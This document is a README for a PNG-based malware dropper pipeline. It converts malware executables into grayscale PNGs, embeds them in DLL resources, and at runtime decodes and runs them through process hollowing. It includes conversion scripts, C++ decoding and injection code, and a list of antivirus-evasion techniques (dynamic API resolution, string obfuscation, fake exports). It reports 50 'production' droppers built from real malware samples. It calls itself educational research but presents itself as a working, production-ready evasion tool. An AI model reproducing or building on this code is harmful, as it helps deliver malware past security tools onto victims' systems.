# Main files and folders : image.dll/Source.cpp, image.dll/lodepng.cpp and utils/pe_to_image.py, utils/create_full_png_droppers.py
# PNG-Embedded Dropper System

## Overview
A production-ready dropper system that converts malware executables into PNG image format for evasion and transport. The system performs lossless PE-to-PNG conversion using direct byte mapping, then reconstructs and executes the original malware at runtime via advanced in-memory PE injection.

**Important**: This is **NOT steganography**. We convert raw PE bytes directly into PNG pixel values, creating new PNG files rather than hiding data within existing images.


🔍 Detailed Conversion Analysis
Step 1: PE Reading
```
# Example: Malware sample is 180,736 bytes
pe_data = f.read()  # 180,736 bytes of actual malware code
```
Step 2: Dimension Calculation
```
pe_size = 180,736 bytes
width = ceil(sqrt(180,736)) = ceil(425.13) = 426
height = ceil(180,736 / 426) = ceil(424.26) = 425
total_pixels = 426 × 425 = 181,050 pixels needed
```
Step 3: Padding Calculation & Application
What gets padded?
```
padding_needed = 181,050 - 180,736 = 314 bytes
pe_data_padded = pe_data + b'\x00' * 314
# Result: 180,736 bytes malware + 314 zero bytes = 181,050 bytes total
```

314 null bytes (\x00) added AFTER the malware
No modification of the original 180,736 malware bytes
Padding is pure zeros appended to the end


## PE ↔ PNG Conversion Process

### Encoding (PE → PNG)
**Library Used**: Python PIL (Pillow) + NumPy for image creation
**Method**: Direct byte-to-pixel mapping

```python
# pe_to_image.py conversion process
def pe_to_png(pe_path, output_path):
    # 1. Read raw PE bytes
    pe_data = open(pe_path, 'rb').read()
    pe_size = len(pe_data)
    
    # 2. Calculate near-square dimensions to minimize file size
    width = math.ceil(math.sqrt(pe_size))
    height = math.ceil(pe_size / width)
    
    # 3. Pad PE data to fit exact image dimensions
    total_pixels = width * height
    padding_needed = total_pixels - pe_size
    padded_data = pe_data + b'\x00' * padding_needed
    
    # 4. Convert bytes to grayscale image array
    image_array = np.frombuffer(padded_data, dtype=np.uint8).reshape(height, width)
    
    # 5. Create PNG: Each PE byte becomes one pixel (0-255 grayscale)
    image = Image.fromarray(image_array, mode='L')  # 8-bit grayscale
    image.save(output_path, 'PNG')
```

**Key Formula**: `width = ceil(sqrt(pe_size))` creates near-square images for optimal compression.

### Decoding (PNG → PE)
**Library Used**: LodePNG (C library) for high-performance decoding
**Method**: Pixel-to-byte extraction with PE validation

```cpp
// Source.cpp png_to_pe() function
void* png_to_pe(unsigned char* png_data, size_t png_size, DWORD* pe_size) {
    unsigned char* image_data;
    unsigned width, height;
    
    // 1. Decode PNG using LodePNG library (LCT_GREY, 8-bit)
    unsigned error = lodepng_decode_memory(&image_data, &width, &height, 
                                         png_data, png_size, LCT_GREY, 8);
    
    // 2. Calculate total pixel count = total PE bytes
    size_t total_image_size = width * height;
    
    // 3. Copy pixel values back to PE buffer (1 pixel = 1 byte)
    void* pe_data = malloc(total_image_size);
    memcpy(pe_data, image_data, total_image_size);
    free(image_data);
    
    // 4. Validate PE structure and determine actual size
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)pe_data;
    if (dos_header->e_magic == IMAGE_DOS_SIGNATURE) {  // "MZ" signature
        PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((BYTE*)pe_data + dos_header->e_lfanew);
        if (nt_headers->Signature == IMAGE_NT_SIGNATURE) {  // "PE" signature
            *pe_size = nt_headers->OptionalHeader.SizeOfImage;  // Remove padding
        }
    }
    
    return pe_data;
}
```

### Conversion Mathematics
- **Encoding**: `PE_byte[i] → PNG_pixel[i]` (values 0-255 preserved exactly)
- **Dimensions**: `width × height ≥ pe_size` (minimal padding for square fit)
- **Decoding**: `PNG_pixel[i] → PE_byte[i]` (lossless reconstruction)
- **Size Recovery**: PE headers provide exact original size vs padded image size

### Why This Works
1. **8-bit Grayscale**: PNG pixels store values 0-255, matching byte range exactly
2. **Lossless Compression**: PNG preserves all pixel values without artifacts  
3. **1:1 Mapping**: Each PE byte becomes exactly one pixel value
4. **PE Validation**: DOS/NT signatures confirm successful reconstruction

## Production Files Analysis

### Core Components (`image.dll/` folder)
- **`Source.cpp`** - Runtime PNG decoder & PE injector (C++)
- **`lodepng.cpp/h`** - PNG encoding/decoding library (version 20250506)
- **`Resource.rc`** - Resource embedding script
- **`resource.h`** - Resource definitions

### Utility Scripts (`utils/` folder)  
- **`create_full_png_droppers.py`** - Main batch orchestrator
- **`pe_to_image.py`** - PE→PNG converter
- **`build_single_dropper.sh`** - MinGW cross-compiler script

### Output
- **`png_droppers_no_encoding/`** - 50 production dropper DLLs (733KB - 1.7MB each)

---

## Step-by-Step Program Flow

### Stage 1: Batch Processing Setup
**`create_full_png_droppers.py`** (lines 28-45):
- Reads 50 malware samples from `/home/mihir/Downloads/to_be_evaded_ds_unpacked/`
- Creates output directory `png_droppers_no_encoding/`
- Processes each binary file sequentially

### Stage 2: Binary → PNG Conversion  
**`create_full_png_droppers.py`** calls **`pe_to_image.py`** (lines 67-81):
```python
# Step 1: Convert binary to PNG
result = subprocess.run([
    sys.executable, 
    str(utils_dir / "pe_to_image.py"),
    str(binary_file),
    str(png_file)
], capture_output=True, text=True)
```

**`pe_to_image.py`** performs **lossless binary-to-image conversion**:
- Reads raw PE bytes from malware sample
- Calculates near-square dimensions: `width = ceil(sqrt(pe_size))`
- Pads bytes to fit image dimensions: `pe_data + b'\x00' * padding_needed`
- **Creates grayscale PNG**: `Image.fromarray(image_array, mode='L')` 
  - Each pixel = 1 byte of PE data (0-255 grayscale values)
  - **No data hiding**: PE bytes become literal pixel values
- Saves `.png` + `.png.meta` (stores original size for accurate trimming)

### Stage 3: Dropper Project Assembly
**`create_full_png_droppers.py`** (lines 82-95):
- Copies `image.dll/Dropper/` template → `temp_build_dir/dropper_{sample}/`
- Copies converted PNG → `dropper_{sample}/payload.png`
- Updates project files for compilation

### Stage 4: Resource Embedding (Not Steganography)
**`Resource.rc`**:
```rc
IDR_PNG1 PNG "payload.png"    // Embeds complete PNG file as binary resource
```
This embeds the **entire PNG file** (headers + pixel data + metadata) into the DLL resource section as resource type 256 (PNG), ID 101 (IDR_PNG1).

**Critical distinction**: We are **not** hiding data within an existing image. We are storing a complete PNG file that contains our PE data as its pixel values.

### Stage 5: DLL Compilation
**`create_full_png_droppers.py`** calls **`build_single_dropper.sh`** (lines 96-110):
- MinGW cross-compilation: `x86_64-w64-mingw32-g++`
- Links: `Source.cpp` + `lodepng.cpp` + `Resource.rc`
- Output: `png_droppers_no_encoding/dropper_{sample}.dll`

---

## Runtime Execution Flow

### Stage 6: DLL Loading & API Resolution
**`Source.cpp`** - **`DllMain()`** (lines 161-184):
```cpp
// Dynamic API resolution to evade static analysis
k32 = LoadLibraryA(decode(k32enc,13));  // "Kernel32.dll"
frw = (MyFindResourceW)GetProcAddress(k32,decode(findrsrcenc,14));
mlr = (MyLoadResource)GetProcAddress(k32,decode(loadrsrcenc,13));
// ... resolve all APIs dynamically
run(hModule);  // Launch main dropper function
```

### Stage 7: Resource Extraction
**`Source.cpp`** - **`run()`** function (lines 412-424):
```cpp
// Handle to myself
HMODULE h = (HMODULE)hModule;
// Locate PNG resource (IDR_PNG1 = 101, PNG = 256)
HRSRC r = frw(h,MAKEINTRESOURCE(IDR_PNG1),MAKEINTRESOURCE(PNG));
// Load and lock resource to get PNG file bytes
HGLOBAL rc = mlr(h,r);
void* data = mlor(rc);     // Pointer to complete PNG file bytes
DWORD size = sor(h,r);     // PNG file size (including headers)
```

### Stage 8: Encoding Skip (Clean Pipeline)
**`Source.cpp`** - **`run()`** continues (lines 427-432):
```cpp
// Obfuscation disabled for clean PNG-only pipeline
#ifdef XOR_ENCODE       // DISABLED - commented out in source
    data = XOR(data,size);
#endif
#ifdef BASE64           // DISABLED - commented out in source  
    data = base64decode(data,&size);
#endif
```

### Stage 9: PNG Decoding & PE Reconstruction
**`Source.cpp`** - **`png_to_pe()`** function (lines 355-407):

This is the **critical reversal step** that reconstructs the original PE from PNG pixel data:

```cpp
#ifdef PNG_DECODE       // ENABLED
    // Step 1: Decode PNG using lodepng library  
    unsigned char* image_data;
    unsigned width, height;
    unsigned error = lodepng_decode_memory(&image_data, &width, &height, 
                                         png_data, png_size, LCT_GREY, 8);
    
    if (error) {
        *pe_size = 0;
        return NULL;  // PNG decode failed
    }
    
    // Step 2: Extract PE bytes from pixel data
    size_t total_image_size = width * height;  // Total pixels = total PE bytes
    
    // Step 3: Allocate buffer and copy pixel data
    void* pe_data = mm(total_image_size);      // Malloc PE buffer
    memcpy(pe_data, image_data, total_image_size);  // Copy pixels → PE bytes
    free(image_data);  // Free lodepng memory
    
    // Step 4: PE validation and size detection
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)pe_data;
    if (dos_header->e_magic == IMAGE_DOS_SIGNATURE) {  // Check "MZ" signature
        PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((BYTE*)pe_data + dos_header->e_lfanew);
        if (nt_headers->Signature == IMAGE_NT_SIGNATURE) {  // Check "PE" signature
            // Use PE header's SizeOfImage for accurate size (removes padding)
            *pe_size = nt_headers->OptionalHeader.SizeOfImage;
        }
    }
#endif
```

**Key PNG Decoding Details**:
- **`LCT_GREY, 8`**: Decodes as 8-bit grayscale (each pixel = 1 byte)
- **1:1 mapping**: Each PNG pixel value becomes 1 PE byte (lossless conversion)
- **Size calculation**: `width × height = total_pixels = total_PE_bytes`
- **Padding removal**: PE header's `SizeOfImage` provides true PE size vs padded image size
- **Memory management**: lodepng allocates `image_data`, we copy to our `pe_data` buffer and free lodepng's memory

### Stage 10: In-Memory PE Injection
**`Source.cpp`** - **`launch()`** → **`runPE64()`** (lines 188-387):
```cpp
// Create suspended target process (typically current executable)
CreateProcess(NULL, wszArgsBuffer, NULL, NULL, TRUE, CREATE_SUSPENDED, ...);

// Allocate memory at PE's preferred ImageBase address
LPVOID lpImageBase = VirtualAllocEx(lpPI->hProcess, 
                                   (LPVOID)lpNTHeader->OptionalHeader.ImageBase,
                                   lpNTHeader->OptionalHeader.SizeOfImage,
                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

// Write PE headers to target process
WriteProcessMemory(lpPI->hProcess, lpImageBase, lpImage, 
                  lpNTHeader->OptionalHeader.SizeOfHeaders, NULL);

// Map all PE sections into target process memory
for (SIZE_T iSection = 0; iSection < lpNTHeader->FileHeader.NumberOfSections; ++iSection) {
    // Calculate section virtual address and copy section data
    WriteProcessMemory(lpPI->hProcess, section_va, section_data, section_size, NULL);
}

// Update entry point and resume execution
stCtx.Rcx = (DWORD64)lpImageBase + lpNTHeader->OptionalHeader.AddressOfEntryPoint;
SetThreadContext(lpPI->hThread, &stCtx);
ResumeThread(lpPI->hThread);  // Execute injected PE
```

---

## Complete Data Transformation Chain

```
Original Malware.exe (raw PE bytes)
    ↓ pe_to_image.py
Grayscale PNG (1 byte per pixel, PE bytes as pixel values, padded to square)
    ↓ create_full_png_droppers.py  
Resource.rc embeds complete PNG file → DLL compilation
    ↓ build_single_dropper.sh (MinGW cross-compiler)
dropper_X.dll (contains PNG file in IDR_PNG1 resource section)
    ↓ Runtime: DLL load triggers DllMain() → run()
FindResource/LoadResource extracts complete PNG file bytes
    ↓ lodepng_decode_memory(LCT_GREY, 8) 
Raw pixel array (grayscale values 0-255 = original PE bytes + padding)
    ↓ PE header validation & SizeOfImage-based trimming
Original PE bytes restored (padding removed)
    ↓ runPE64() advanced process hollowing
CreateProcess(SUSPENDED) → VirtualAllocEx → WriteProcessMemory → ResumeThread
    ↓ 
Malware executes in target process memory space
```

## Technical Implementation Details

### PNG Conversion Method (Not Steganography)
- **Direct byte mapping**: PE byte value becomes PNG pixel grayscale value (0-255)
- **Lossless preservation**: PNG grayscale mode preserves exact byte values
- **Square optimization**: Near-square dimensions minimize file size overhead
- **No carrier image**: We create the PNG from scratch, not hiding within existing images
- **Metadata storage**: Original size stored in `.png.meta` for accurate reconstruction

### Evasion Techniques
- **Dynamic API resolution**: All Windows APIs resolved at runtime via `GetProcAddress()`
- **String obfuscation**: API names stored as integer arrays, decoded at runtime
- **200+ dead exports**: Fake export table mimics legitimate system DLLs
- **In-memory execution**: Advanced process hollowing (no disk writes)
- **Resource embedding**: Malware appears as PNG image resources (but not hidden within images)

### Build Pipeline Efficiency  
- **Batch processing**: Processes 50 samples in 84 seconds (~1.7s per dropper)
- **Template-based**: Single `image.dll/Dropper/` template for all variants
- **Cross-compilation**: MinGW produces Windows DLLs on Linux
- **Automated workflow**: Complete PE → PNG → DLL pipeline

## Production Results
✅ **50 dropper DLLs successfully created**  
✅ **Size range**: 733KB - 1.7MB (includes dropper runtime + lodepng library + PNG payload)  
✅ **100% success rate** in batch processing  
✅ **Clean PNG embedding verified** (PNG headers confirmed at consistent offsets)

## Key Distinctions

### What This IS:
- **PNG-based PE packing**: Converting PE executables into PNG format for storage
- **Resource embedding**: Storing PNG files as DLL resources
- **Lossless binary conversion**: PE ↔ PNG conversion preserves all data
- **Advanced process injection**: In-memory PE execution via process hollowing

### What This is NOT:
- **Steganography**: We don't hide data within existing images
- **Image manipulation**: We don't modify existing PNG files
- **Visual deception**: The PNG doesn't look like a normal image (it's grayscale noise)
- **Carrier-based hiding**: No host image is used to conceal the payload

This implementation demonstrates advanced malware packing techniques using PNG as a binary storage format combined with sophisticated runtime PE injection for educational cybersecurity research.
